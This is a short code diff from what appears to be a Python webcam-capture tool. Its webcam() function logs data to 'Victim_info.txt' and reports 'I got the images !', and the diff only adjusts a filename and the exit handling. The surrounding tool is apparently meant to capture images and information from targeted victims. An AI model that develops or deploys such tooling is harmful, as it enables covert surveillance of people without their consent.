@@ -119,7 +119,7 @@ def webcam():
                     sleep(1)
                     df.to_csv("Victim_info.txt", index=False , mode="a")
 
-                    victim_file= open("victim_info.txt", "a")
+                    victim_file= open("Victim_info.txt", "a")
                     victim_file.write("\n")
                     sleep(3)
                     open("info.json" , "w").close()
@@ -138,11 +138,14 @@ def webcam():
         folder = sum([f.stat().st_size for f in Path("../images").glob("**/*")])
     
         if folder != 0:
-           print(Fore.GREEN + "\r\n\nI got the images !".title() + Fore.RESET)
-            
-           input("\r\npress Esc to exit")
-           keyboard.wait("Esc")
+           Sprint(Fore.GREEN + "\r\n\nI got the images !".title() + Fore.RESET)
            
+           try:
+            Sprint(Fore.YELLOW + "\r\npress ctrl + C for exit".title() + Fore.RESET)
+            sleep(9*9999999)
+           except KeyboardInterrupt:
+            pass
+            
            break
 
     if os.name == "nt":
